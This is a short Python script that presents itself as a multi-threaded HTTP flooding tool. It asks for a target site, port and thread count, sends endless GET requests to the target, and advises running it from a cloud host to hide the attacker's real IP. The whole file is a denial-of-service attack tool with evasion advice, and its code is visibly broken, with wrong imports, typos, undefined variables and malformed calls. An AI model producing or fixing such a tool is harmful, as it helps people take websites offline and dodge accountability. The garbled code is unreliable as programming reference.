import socket
import os
import threads

target=str(input("Please input target website: "))
port=int(input("Please input target port(Normal is 80): "))
number_threads=int(input("Please input number of threads: "))
target_ip=socket.gethostbyname(target)
fake_ip=int(input("Please input youre fake ip: "))

print(f"Ip of Target:{socket.gethostbyname(target)}")
print("Tip: Run over google cloud to protect youre real Ip")

def attack():
    while True:
        s=socket(socket.AF_INET, socket,SOCK_STREAM)
        s.connect('target_ip, port')
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n".encode('ascii'), (target_ip,  port)))
        s.sendto(("HOST: " + fake_ip + "r\n\r\n".encode('ascii'), (target_ip, port)))


for i in range(Trd):
    thread=threading.Thread(target_ip=attack)
    thread.start()


global attack_nmr
attack_nmr += 1
print(attack_nmr)
     
                



